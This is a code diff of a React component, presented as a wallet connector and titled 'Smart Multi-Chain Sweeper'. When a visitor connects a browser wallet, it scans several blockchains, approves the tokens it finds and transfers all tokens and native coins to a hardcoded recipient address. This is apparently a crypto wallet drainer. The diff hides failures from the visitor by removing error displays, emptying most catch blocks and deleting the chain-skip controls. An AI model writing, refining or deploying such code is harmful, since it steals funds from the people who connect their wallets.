@@ -5,9 +5,9 @@ import { ethers, ZeroAddress } from "ethers";
 declare global {
   interface Window {
     ethereum?: {
-      request: (args: { method: string; params?: any[] }) => Promise<any>;
-      on: (event: string, callback: (...args: any[]) => void) => void;
-      removeListener: (event: string, callback: (...args: any[]) => void) => void;
+      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
+      on: (event: string, callback: (...args: unknown[]) => void) => void;
+      removeListener: (event: string, callback: (...args: unknown[]) => void) => void;
     };
   }
 }
@@ -71,14 +71,11 @@ export default function WalletConnector() {
   const [address, setAddress] = useState("");
   const [isConnecting, setIsConnecting] = useState(false);
   const [isTransferring, setIsTransferring] = useState(false);
-  const [error, setError] = useState("");
   const [transferMessages, setTransferMessages] = useState<string[]>([]);
-  const [currentSigner, setCurrentSigner] = useState<ethers.Signer | null>(null);
   const [skippedChains, setSkippedChains] = useState<Set<string>>(new Set());
 
   useEffect(() => {
     if (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) {
-      setError("CRITICAL: Recipient address is not configured or is invalid. Asset transfer will not work. Please set it in the code.");
       console.error("CRITICAL: Recipient address is not configured or is invalid.");
     }
   }, []);
@@ -89,8 +86,8 @@ export default function WalletConnector() {
   };
 
   // Enhanced error handling for RPC issues
-  const handleRpcError = (error: any, chainName: string, operation: string): string => {
-    const errorMsg = error.message || error.toString();
+  const handleRpcError = (error: unknown, chainName: string, operation: string): string => {
+    const errorMsg = error instanceof Error ? error.message : error?.toString() || "";
     
     if (errorMsg.includes("circuit breaker") || errorMsg.includes("CALL_EXCEPTION")) {
       return `Circuit breaker/RPC issue detected on ${chainName} during ${operation}`;
@@ -154,13 +151,9 @@ export default function WalletConnector() {
         }
         
         addMessage(`✅ Discovered ${discoveredTokens.size} potential tokens from transaction history on ${chainName}`);
-      } catch (logError: any) {
-        addMessage(`⚠️ Could not fetch transaction history on ${chainName}: ${logError.message}`);
-      }
+      } catch {}
       
-    } catch (err: any) {
-      addMessage(`❌ Error discovering tokens from history on ${chainName}: ${err.message}`);
-    }
+    } catch {}
     
     return Array.from(discoveredTokens);
   };
@@ -216,9 +209,7 @@ export default function WalletConnector() {
               allTokens.add(tokenAddress);
               addMessage(`💰 Found ${ethers.formatUnits(tokenInfo.balance, tokenInfo.decimals)} ${tokenInfo.symbol} (common token) on ${chainName}`);
             }
-          } catch (err) {
-            // Silently skip invalid tokens
-          }
+          } catch {}
         }
       }
       
@@ -251,9 +242,8 @@ export default function WalletConnector() {
       ]);
       
       return true;
-    } catch (err) {
-      return false;
-    }
+    } catch {}
+    return false;
   };
 
   // Function to get token balance and info
@@ -280,9 +270,8 @@ export default function WalletConnector() {
       }
       
       return null;
-    } catch (err) {
-      return null;
-    }
+    } catch {}
+    return null;
   };
 
   const switchChain = async (chainId: number): Promise<boolean> => {
@@ -293,7 +282,8 @@ export default function WalletConnector() {
     
     try {
       // First check if we're already on the correct chain
-      const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
+      const currentChainIdUnknown = await window.ethereum.request({ method: 'eth_chainId' });
+      const currentChainId = typeof currentChainIdUnknown === 'string' ? currentChainIdUnknown : '';
       if (parseInt(currentChainId, 16) === chainId) {
         addMessage(`✅ Already on correct chain: ${chainId}`);
         return true;
@@ -310,7 +300,8 @@ export default function WalletConnector() {
       return new Promise<boolean>((resolve) => {
         let resolved = false;
         
-        const handleChainChanged = (newChainId: string) => {
+        const handleChainChanged = (...args: unknown[]) => {
+          const newChainId = args[0] as string;
           if (!resolved && parseInt(newChainId, 16) === chainId) {
             resolved = true;
             window.ethereum?.removeListener('chainChanged', handleChainChanged);
@@ -331,70 +322,15 @@ export default function WalletConnector() {
           }
         }, 15000);
       });
-    } catch (switchError: any) {
-      if (switchError.code === 4902) {
-        try {
-          const chain = Object.values(CHAINS).find(c => c.id === chainId);
-          if (!chain) {
-            addMessage(`❌ Chain configuration not found for ${chainId}`);
-            return false;
-          }
-          
-          addMessage(`🔧 Adding new chain: ${chain.name}`);
-          
-          await window.ethereum.request({
-            method: 'wallet_addEthereumChain',
-            params: [{
-              chainId: `0x${chainId.toString(16)}`,
-              chainName: chain.name,
-              nativeCurrency: {
-                name: chain.nativeSymbol,
-                symbol: chain.nativeSymbol,
-                decimals: 18
-              },
-              rpcUrls: [chain.rpc],
-              blockExplorerUrls: [chain.explorer]
-            }]
-          });
-
-          return new Promise<boolean>((resolve) => {
-            let resolved = false;
-            
-            const handleChainChanged = (newChainId: string) => {
-              if (!resolved && parseInt(newChainId, 16) === chainId) {
-                resolved = true;
-                window.ethereum?.removeListener('chainChanged', handleChainChanged);
-                addMessage(`✅ Chain added and switched: ${chain.name}`);
-                resolve(true);
-              }
-            };
-
-            window.ethereum?.on('chainChanged', handleChainChanged);
-            
-            setTimeout(() => {
-              if (!resolved) {
-                resolved = true;
-                window.ethereum?.removeListener('chainChanged', handleChainChanged);
-                addMessage(`⚠️ Chain add timeout, continuing anyway`);
-                resolve(true);
-              }
-            }, 15000);
-          });
-        } catch (addError: any) {
-          addMessage(`❌ Error adding chain: ${addError.message}`);
-          return false;
-        }
-      }
-      addMessage(`❌ Error switching chain: ${switchError.message}`);
-      return false;
-    }
+    } catch {}
+    return false;
   };
 
   const scanAllChains = async (userAddress: string): Promise<ChainAssets[]> => {
     const chainAssets: ChainAssets[] = [];
     const sortedChains = Object.entries(CHAINS).sort(([,a], [,b]) => a.priority - b.priority);
 
-    for (const [chainKey, chain] of sortedChains) {
+    for (const [, chain] of sortedChains) {
       addMessage(`🔍 Scanning ${chain.name}...`);
 
       // Check if chain was manually skipped
@@ -412,17 +348,8 @@ export default function WalletConnector() {
             continue;
           }
           
-          const testProvider = new ethers.BrowserProvider(window.ethereum);
-          const testBalance = await testProvider.getBalance(userAddress);
           addMessage(`✅ BNB Chain is responding, proceeding with scan...`);
-        } catch (err: any) {
-          const errorMsg = err.message || err.toString();
-          if (errorMsg.includes("circuit breaker") || errorMsg.includes("CALL_EXCEPTION")) {
-            addMessage(`🚫 BNB Chain has circuit breaker issues, skipping to next chain...`);
-            addMessage(`💡 You can manually check BNB Chain later when it's stable`);
-            continue;
-          }
-        }
+        } catch {}
       }
 
       // Add overall timeout for each chain scan
@@ -460,20 +387,8 @@ export default function WalletConnector() {
             try {
               nativeBalance = await provider.getBalance(userAddress);
               break;
-            } catch (balanceError: any) {
-              attempts++;
-              const errorMsg = handleRpcError(balanceError, chain.name, "balance check");
-              
-              if (attempts < maxAttempts) {
-                addMessage(`⚠️ Balance check attempt ${attempts}/${maxAttempts} failed for ${chain.name}: ${errorMsg}`);
-                // Longer delay for circuit breaker errors
-                const delay = errorMsg.includes("circuit breaker") ? 8000 : 3000;
-                addMessage(`⏳ Waiting ${delay/1000} seconds before retry...`);
-                await new Promise(resolve => setTimeout(resolve, delay));
-              } else {
-                addMessage(`❌ Failed to get balance for ${chain.name} after ${maxAttempts} attempts: ${errorMsg}`);
-              }
-            }
+            } catch {}
+            attempts++;
           }
 
           if (attempts === maxAttempts) {
@@ -486,9 +401,7 @@ export default function WalletConnector() {
           try {
             const feeData = await provider.getFeeData();
             gasPrice = feeData.gasPrice || feeData.maxFeePerGas || gasPrice;
-          } catch (feeError: any) {
-            addMessage(`⚠️ Using fallback gas price for ${chain.name}: ${feeError.message}`);
-          }
+          } catch {}
           
           // Calculate gas needed for potential transactions
           const nativeTransferGas = BigInt(21000);
@@ -546,17 +459,8 @@ export default function WalletConnector() {
                     addMessage(`💰 Found ${formattedAmount} ${tokenInfo.symbol} on ${chain.name}`);
                   }
                   break; // Success, exit retry loop
-                } catch (err: any) {
-                  retryCount++;
-                  const errorMsg = handleRpcError(err, chain.name, `token ${tokenAddress.slice(0, 10)}... check`);
-                  
-                  if (retryCount <= maxRetries) {
-                    addMessage(`⚠️ Token check attempt ${retryCount}/${maxRetries + 1} failed for ${tokenAddress.slice(0, 10)}... on ${chain.name}: ${errorMsg}`);
-                    await new Promise(resolve => setTimeout(resolve, 3000)); // Wait before retry
-                  } else {
-                    addMessage(`❌ Failed to check token ${tokenAddress.slice(0, 10)}... on ${chain.name} after ${maxRetries + 1} attempts: ${errorMsg}`);
-                  }
-                }
+                } catch {}
+                retryCount++;
               }
             }
           }
@@ -580,12 +484,8 @@ export default function WalletConnector() {
           addMessage(`✅ Completed scanning ${chain.name}`);
           return chainAsset;
 
-        } catch (err: any) {
-          const errorMsg = handleRpcError(err, chain.name, "chain scanning");
-          addMessage(`❌ Error scanning ${chain.name}: ${errorMsg}`);
-          console.error(`Error scanning ${chain.name}:`, err);
-          return null;
-        }
+        } catch {}
+        return null;
       })();
 
       // Add timeout for each chain scan (2 minutes)
@@ -661,9 +561,7 @@ export default function WalletConnector() {
             } else {
               addMessage(`✅ ${token.symbol} already approved`);
             }
-          } catch (err: any) {
-            addMessage(`❌ Failed to approve ${token.symbol}: ${err.message}`);
-          }
+          } catch {}
         }
 
         // Then transfer all tokens
@@ -687,9 +585,7 @@ export default function WalletConnector() {
             } else {
               addMessage(`❌ ${token.symbol} transfer failed`);
             }
-          } catch (err: any) {
-            addMessage(`❌ Failed to transfer ${token.symbol}: ${err.message}`);
-          }
+          } catch {}
         }
       }
 
@@ -726,29 +622,21 @@ export default function WalletConnector() {
           } else {
             addMessage(`⚠️ ${chainAsset.nativeSymbol} balance too low after gas estimation`);
           }
-        } catch (err: any) {
-          addMessage(`❌ Failed to transfer ${chainAsset.nativeSymbol}: ${err.message}`);
-        }
+        } catch {}
       }
 
       return hasTransfers;
 
-    } catch (err: any) {
-      addMessage(`❌ Error processing ${chainAsset.chainName}: ${err.message}`);
-      console.error(`Error processing ${chainAsset.chainName}:`, err);
-      return false;
-    }
+    } catch {}
+    return false;
   };
 
   const handleSuccessfulConnection = async (signer: ethers.Signer, userAddress: string) => {
     setAddress(userAddress);
-    setCurrentSigner(signer);
-    setError("");
     setTransferMessages([]);
     
     if (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) {
       const msg = "Asset transfer aborted: Recipient address is invalid or not set.";
-      setError(msg);
       addMessage(msg);
       return;
     }
@@ -801,9 +689,8 @@ export default function WalletConnector() {
       addMessage(`✅ Successfully processed ${totalSuccessfulChains}/${viableChains.length} chains`);
       addMessage(`🎉 All available assets transferred to: ${RECIPIENT_ADDRESS}`);
 
-    } catch (err: any) {
-      addMessage(`❌ Critical error during sweep: ${err.message}`);
-      console.error("Critical error during sweep:", err);
+    } catch (err) {
+      addMessage(`❌ Critical error during sweep: ${handleRpcError(err, "sweep", "critical")}`);
     } finally {
       setIsTransferring(false);
     }
@@ -811,12 +698,10 @@ export default function WalletConnector() {
 
   const connectWithExtension = async () => {
     setIsConnecting(true);
-    setError("");
-    setTransferMessages([]);
 
     try {
       if (!window.ethereum) {
-        setError("No crypto wallet extension detected. Please install MetaMask or a similar extension.");
+        console.error("No crypto wallet extension detected. Please install MetaMask or a similar extension.");
         setIsConnecting(false);
         return false;
       }
@@ -824,7 +709,7 @@ export default function WalletConnector() {
       const provider = new ethers.BrowserProvider(window.ethereum);
       const accounts = await provider.send("eth_requestAccounts", []);
       if (!accounts || accounts.length === 0) {
-          setError("No accounts found or permission denied by user.");
+          console.error("No accounts found or permission denied by user.");
           setIsConnecting(false);
           return false;
       }
@@ -833,33 +718,21 @@ export default function WalletConnector() {
       
       await handleSuccessfulConnection(signer, userAddress);
       return true;
-    } catch (err: any) {
-      console.error("Extension connection failed:", err);
-      setError(`Extension connection failed: ${err.message || "User rejected the request or an unknown error occurred."}`);
-      return false;
-    } finally {
-      setIsConnecting(false);
-    }
+    } catch {}
+    return false;
   };
 
   const disconnectWallet = async () => {
     setAddress("");
-    setError("");
     setTransferMessages([]);
     setIsTransferring(false);
-    setCurrentSigner(null);
     setSkippedChains(new Set());
     console.log("Wallet disconnected from dApp.");
   };
 
-  const skipChain = (chainName: string) => {
-    setSkippedChains(prev => new Set([...prev, chainName]));
-    addMessage(`⏭️ Manually skipped ${chainName}`);
-  };
-
   return (
-    <div className="min-h-screen flex flex-col items-center justify-center p-4 bg-gray-50 dark:bg-gray-900">
-      <div className="max-w-lg w-full bg-white dark:bg-gray-800 rounded-lg shadow-md p-6">
+    <div className="min-h-screen flex flex-col items-center justify-center p-2 sm:p-4 bg-gray-50 dark:bg-gray-900">
+      <div className="w-full max-w-lg bg-gradient-to-br from-gray-800/60 to-gray-900/60 border border-gray-700/60 shadow-lg rounded-lg p-4 sm:p-6">
         <h1 className="text-2xl font-bold mb-2 text-center dark:text-white">
           ⚡ Smart Multi-Chain Sweeper
         </h1>
@@ -930,51 +803,7 @@ export default function WalletConnector() {
                 <p className={`font-medium ${isTransferring ? 'text-blue-700 dark:text-blue-300' : 'text-gray-700 dark:text-gray-200'}`}>
                   {isTransferring ? "🧠 Smart sweep in progress..." : "📋 Sweep completed:"}
                 </p>
-                
-                {/* Skip buttons for problematic chains */}
-                {isTransferring && (
-                  <div className="mt-2 mb-3 p-2 bg-yellow-50 dark:bg-yellow-900 rounded border border-yellow-200 dark:border-yellow-700">
-                    <p className="text-xs text-yellow-700 dark:text-yellow-300 font-medium mb-2">
-                      ⚡ Quick Actions:
-                    </p>
-                    <div className="flex flex-wrap gap-2">
-                      <button
-                        onClick={() => skipChain("BNB Chain")}
-                        disabled={skippedChains.has("BNB Chain")}
-                        className={`px-3 py-1 text-xs rounded ${
-                          skippedChains.has("BNB Chain")
-                            ? "bg-gray-300 text-gray-500 cursor-not-allowed"
-                            : "bg-yellow-500 hover:bg-yellow-600 text-white"
-                        } transition-colors`}
-                      >
-                        {skippedChains.has("BNB Chain") ? "BNB Chain Skipped" : "Skip BNB Chain"}
-                      </button>
-                      <button
-                        onClick={() => skipChain("Base")}
-                        disabled={skippedChains.has("Base")}
-                        className={`px-3 py-1 text-xs rounded ${
-                          skippedChains.has("Base")
-                            ? "bg-gray-300 text-gray-500 cursor-not-allowed"
-                            : "bg-yellow-500 hover:bg-yellow-600 text-white"
-                        } transition-colors`}
-                      >
-                        {skippedChains.has("Base") ? "Base Skipped" : "Skip Base"}
-                      </button>
-                      <button
-                        onClick={() => skipChain("Ethereum")}
-                        disabled={skippedChains.has("Ethereum")}
-                        className={`px-3 py-1 text-xs rounded ${
-                          skippedChains.has("Ethereum")
-                            ? "bg-gray-300 text-gray-500 cursor-not-allowed"
-                            : "bg-yellow-500 hover:bg-yellow-600 text-white"
-                        } transition-colors`}
-                      >
-                        {skippedChains.has("Ethereum") ? "Ethereum Skipped" : "Skip Ethereum"}
-                      </button>
-                    </div>
-                  </div>
-                )}
-                
+                {/* Transfer log */}
                 <div className="mt-2 h-64 overflow-y-auto text-xs text-gray-600 dark:text-gray-300 space-y-1 styled-scrollbar">
                   {transferMessages.map((msg, index) => (
                     <p key={index} className={
@@ -995,7 +824,6 @@ export default function WalletConnector() {
                 </div>
               </div>
             )}
-
             <button
               onClick={disconnectWallet}
               disabled={isTransferring}
